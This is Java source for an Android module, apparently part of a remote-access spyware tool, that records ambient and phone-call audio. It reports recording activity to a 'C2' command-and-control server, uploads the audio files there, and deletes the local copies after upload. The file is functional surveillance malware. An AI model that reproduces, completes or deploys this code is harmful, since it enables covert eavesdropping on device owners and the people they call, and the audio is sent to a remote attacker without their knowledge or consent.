package com.tarjon.admin.utils;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Manages audio recording functionality
 * Handles ambient recording and microphone access
 */
public class AudioRecorder {
    private static final String TAG = "AudioRecorder";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    // Recording components
    private MediaRecorder mediaRecorder;
    private String currentRecordingPath;
    private Timer recordingTimer;
    private boolean isRecording = false;
    
    // Default recording settings
    private static final int DEFAULT_DURATION = 60; // seconds
    
    public AudioRecorder(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newSingleThreadExecutor();
    }
    
    /**
     * Start audio recording
     * @param source Audio source (MediaRecorder.AudioSource.*)
     * @param duration Duration in seconds (0 for unlimited)
     * @return true if recording started successfully
     */
    public boolean startRecording(int source, int duration) {
        // Check if already recording
        if (isRecording) {
            return true;
        }
        
        // Check for audio recording permission
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != 
                PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Cannot start recording: Recording permission not granted");
            return false;
        }
        
        try {
            // Create file for recording
            File recordingDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "AudioRecordings");
            if (!recordingDir.exists()) {
                recordingDir.mkdirs();
            }
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            String fileName = "audio_" + timestamp + ".3gp";
            File outputFile = new File(recordingDir, fileName);
            
            currentRecordingPath = outputFile.getAbsolutePath();
            
            // Initialize media recorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(source);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setOutputFile(currentRecordingPath);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            
            // Prepare and start recording
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            isRecording = true;
            
            // Set duration if specified
            if (duration <= 0) {
                duration = DEFAULT_DURATION;
            }
            
            // Schedule recording to stop after specified duration
            if (duration > 0) {
                recordingTimer = new Timer();
                recordingTimer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        new Handler(Looper.getMainLooper()).post(() -> stopRecording());
                    }
                }, duration * 1000);
            }
            
            // Log the recording start
            try {
                JSONObject recordingData = new JSONObject();
                recordingData.put("path", currentRecordingPath);
                recordingData.put("startTime", System.currentTimeMillis());
                recordingData.put("duration", duration);
                recordingData.put("source", getSourceName(source));
                
                c2Connection.sendCommandResult("audio_recording_started", 
                        "Audio recording started", 
                        recordingData.toString());
            } catch (JSONException e) {
                Log.e(TAG, "Error creating JSON for recording: " + e.getMessage());
            }
            
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error starting audio recording: " + e.getMessage());
            releaseMediaRecorder();
            return false;
        }
    }
    
    /**
     * Stop audio recording
     * @return Path to the recording file or null if not recording
     */
    public String stopRecording() {
        if (!isRecording) {
            return null;
        }
        
        try {
            // Cancel timer if it exists
            if (recordingTimer != null) {
                recordingTimer.cancel();
                recordingTimer = null;
            }
            
            // Stop recording
            mediaRecorder.stop();
            releaseMediaRecorder();
            
            // Log the recording stop
            try {
                JSONObject recordingData = new JSONObject();
                recordingData.put("path", currentRecordingPath);
                recordingData.put("stopTime", System.currentTimeMillis());
                
                c2Connection.sendCommandResult("audio_recording_stopped", 
                        "Audio recording stopped", 
                        recordingData.toString());
            } catch (JSONException e) {
                Log.e(TAG, "Error creating JSON for recording: " + e.getMessage());
            }
            
            // Return path to recording
            String path = currentRecordingPath;
            currentRecordingPath = null;
            
            return path;
        } catch (Exception e) {
            Log.e(TAG, "Error stopping audio recording: " + e.getMessage());
            releaseMediaRecorder();
            return null;
        }
    }
    
    /**
     * Get name of audio source for logging
     */
    private String getSourceName(int source) {
        switch (source) {
            case MediaRecorder.AudioSource.MIC:
                return "microphone";
            case MediaRecorder.AudioSource.VOICE_CALL:
                return "voice_call";
            case MediaRecorder.AudioSource.VOICE_COMMUNICATION:
                return "voice_communication";
            case MediaRecorder.AudioSource.VOICE_DOWNLINK:
                return "voice_downlink";
            case MediaRecorder.AudioSource.VOICE_UPLINK:
                return "voice_uplink";
            case MediaRecorder.AudioSource.CAMCORDER:
                return "camcorder";
            case MediaRecorder.AudioSource.VOICE_RECOGNITION:
                return "voice_recognition";
            default:
                return "unknown_" + source;
        }
    }
    
    /**
     * Release media recorder resources
     */
    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.reset();
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing media recorder: " + e.getMessage());
            } finally {
                mediaRecorder = null;
                isRecording = false;
            }
        }
    }
    
    /**
     * Upload a recording file to the C2 server
     * @param recordingPath Path to the recording file
     */
    public void uploadRecording(String recordingPath) {
        executor.execute(() -> {
            try {
                FileSystemManager fileManager = new FileSystemManager(context, c2Connection);
                fileManager.downloadFile(recordingPath, new FileSystemManager.FileOperationListener() {
                    @Override
                    public void onProgress(int progress) {
                        c2Connection.sendCommandResult("audio_recording_upload", 
                                "Uploading recording: " + progress + "%");
                    }
                    
                    @Override
                    public void onComplete(String filePath) {
                        c2Connection.sendCommandResult("audio_recording_upload", 
                                "Recording uploaded: " + filePath);
                        
                        // Delete the local file after upload
                        new File(filePath).delete();
                    }
                    
                    @Override
                    public void onError(String error) {
                        c2Connection.sendCommandResult("audio_recording_upload", 
                                "Error uploading recording: " + error);
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Error uploading recording: " + e.getMessage());
                c2Connection.sendCommandResult("audio_recording_upload", 
                        "Error uploading recording: " + e.getMessage());
            }
        });
    }
    
    /**
     * Check if currently recording
     */
    public boolean isRecording() {
        return isRecording;
    }
    
    /**
     * Get current recording path
     */
    public String getCurrentRecordingPath() {
        return currentRecordingPath;
    }
    
    /**
     * Release resources
     */
    public void release() {
        if (isRecording) {
            stopRecording();
        }
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
}